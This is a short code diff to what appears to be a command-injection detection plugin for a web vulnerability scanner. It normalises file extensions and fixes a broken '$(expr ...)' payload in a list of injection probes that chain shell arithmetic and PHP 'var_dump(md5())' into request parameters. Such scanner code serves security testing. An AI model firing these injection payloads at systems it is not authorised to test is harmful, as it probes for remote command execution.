@@ -21,7 +21,7 @@ class POC():
         self.level = 2  # 0:Low  1:Medium 2:High
 
     def verify(self):
-        if self.dictdata.get("url").get("extension") in notAcceptedExt:
+        if self.dictdata.get("url").get("extension").lower() in notAcceptedExt:
             return
         parser = dictdata_parser(self.dictdata)
         params = self.dictdata.get("request").get("params").get("params_url") + \
@@ -33,7 +33,7 @@ class POC():
         payloads = (
             {"cmd": "\nexpr {} + {}\n".format(num1, num2), "show": num1_num2,"method":"a"},
             {"cmd": "|expr {} + {}".format(num1,num2), "show":num1_num2,"method":"a"},
-            {"cmd": "$(expr {} + {}".format(num1,num2), "show": num1_num2,"method":"a"},
+            {"cmd": "$(expr {} + {})".format(num1,num2), "show": num1_num2,"method":"a"},
             {"cmd": "&set /A {}+{}".format(num1,num2), "show": num1_num2,"method":"a"},
             {"cmd": "${@var_dump(md5(%s))};"%num1, "show": num1_md5,"method":"w"},
             {"cmd": "'-var_dump(md5(%s))-'"%num1, "show": num1_md5,"method":"w"},
